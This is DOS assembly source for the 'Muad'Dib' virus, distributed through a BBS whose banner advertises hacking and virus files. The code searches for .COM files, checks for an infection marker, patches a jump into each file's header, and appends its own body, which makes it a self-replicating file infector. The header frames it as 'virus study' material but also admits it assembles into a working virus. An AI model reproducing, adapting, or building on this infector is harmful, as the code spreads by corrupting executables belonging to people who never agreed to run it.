;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;
;                              MUAD'DIB VIRUS                                ;
;****************************************************************************;
        ideal
        model tiny
        codeseg
        org     100h
top:    db      'CP'
        db      058h,04bh
        jmp     near main
        nop
        nop
        nop
        mov     dx,offset _warn
        mov     ah,9
        int     21h
        mov     ax,04c00h
        int     21h

_warn   db      'Deze file was besmet met het Muad''dib Virus$'

main:   push    ax
        push    bx
        push    cx
        push    dx
        push    di
        push    si
        push    es
        push    ds
        call    dummy
dummy:  pop     bx
        mov     si,bx
        add     si,200h         ; Address of data!
        lea     dx,[si+6]
        mov     ah,1ah
        int     21h             ; Set DTA

        mov     dx,si
        mov     cl,0ffh
        mov     ah,04eh
        int     21h             ; Findfirst
        jc      noluck          ; Nah, error
checkit:jmp     is_ill
fnext:  lea     dx,[si + 6]
        mov     ah,04fh
        int     21h
        jc      noluck
        jmp     checkit


noluck:
        mov     ax,[word si + 6 + 44]               ; Current
        mov     [word cs:100h], ax
        mov     ax,[word si + 6 + 44 + 2]
        mov     [word cs:102h], ax
        mov     ax,[word si + 6 + 44 + 4]
        mov     [word cs:104h], ax
        mov     ax,[word si + 6 + 44 + 6]
        mov     [word cs:106h], ax
        pop     ds
        pop     es
        pop     si
        pop     di
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        mov     ax,100h                         ; Goor!
        push    ax                              ; Maar 't werkt wel!
        ret

is_ill:
        lea     dx,[si + 36]    ; Name of file
;        mov     ah,9
;        int     21h             ; For information...
        mov     ah,03dh         ; Fopen
        mov     al,2            ; RW-access
        int     21h
        jc      fnext          ; !?@!? Couldn't open
        push    ax

        pop     bx                      ; Handle
        push    bx
        mov     ah,3fh                  ; Read
        mov     cx,8                    ; 8 please
        lea     dx,[si + 6 + 44 + 8]        ; Offset buffer  (inf buf)
        int     21h

        cmp     [word si + 6 + 44 + 8], 05043h   ; Zick yet?
        je      issick                  ; YEAH!

        pop     bx
        push    bx
        mov     ax,04200h               ; Moef vijlpointer
        xor     cx,cx
        xor     dx,dx                   ; 0L
        int     21h                     ; Move filepointer

        mov     ax,[si + 6 + 26]         ; Fsize
        sub     ax,7
        mov     [si + 6 + 44 + 8 + 8 + 5],ax ; Set jump (jumpbuf)

        pop     bx                      ; Handle
        push    bx
        mov     ah,40h                  ; Write
        mov     cx,8                    ; 8 please
        lea     dx,[si + 6 + 44 + 8 + 8]    ; Offset buffer (jumpbuf)
        int     21h

        pop     bx                      ; Handle
        push    bx
        mov     ax,04202h               ; Moef vijlpointer (einde)
        xor     cx,cx
        xor     dx,dx                   ; 0L
        int     21h                     ; Move filepointer

        call    swap

        pop     bx                      ; Handle
        push    bx
        mov     ah,40h                  ; Write
        mov     cx,1000                 ; ADJUST
        lea     dx,[si - 200h - 11]     ; Offset buffer
        int     21h                     ; Wreit

        call    swap

close:  pop     bx
        mov     ah,03eh
        int     21h
        jmp     noluck                  ; Ready!


issick: pop     bx
        mov     ah,03eh
        int     21h
        jmp     fnext

swap:
        mov     ax,[word si + 6 + 44]
        xchg    [word si + 6 + 44 + 8], ax
        mov     [word si + 6 + 44], ax
        mov     ax,[word si + 6 + 44 + 2]
        xchg    [word si + 6 + 44 + 8 + 2], ax
        mov     [word si + 6 + 44 + 2], ax
        mov     ax,[word si + 6 + 44 + 4]
        xchg    [word si + 6 + 44 + 8 + 4], ax
        mov     [word si + 6 + 44 + 4], ax
        mov     ax,[word si + 6 + 44 + 6]
        xchg    [word si + 6 + 44 + 8 + 6], ax
        mov     [word si + 6 + 44 + 6], ax
        ret

        org     dummy + 200h
        db      '*.COM',0
        db      44      dup ('D')
        db      8       dup (090h)      ; Current buffer
        db      8       dup ('C')       ; Inf buffer
        db      043h,050h,058h,04bh,0e9h
        db      0,0,0,'$'
        end     top

;****************************************************************************;
;                                                                            ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]                            [=-                     ;
;                     -=] For All Your H/P/A/V Files [=-                     ;
;                     -=]    SysOp: Peter Venkman    [=-                     ;
;                     -=]                            [=-                     ;
;                     -=]      +31.(o)79.426o79      [=-                     ;
;                     -=]  P E R F E C T  C R I M E  [=-                     ;
;                     -=][][][][][][][][][][][][][][][=-                     ;
;                                                                            ;
;                    *** NOT FOR GENERAL DISTRIBUTION ***                    ;
;                                                                            ;
; This File is for the Purpose of Virus Study Only! It Should not be Passed  ;
; Around Among the General Public. It Will be Very Useful for Learning how   ;
; Viruses Work and Propagate. But Anybody With Access to an Assembler can    ;
; Turn it Into a Working Virus and Anybody With a bit of Assembly Coding     ;
; Experience can Turn it Into a far More Malevolent Program Than it Already  ;
; Is. Keep This Code in Responsible Hands!                                   ;
;                                                                            ;
;****************************************************************************;

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

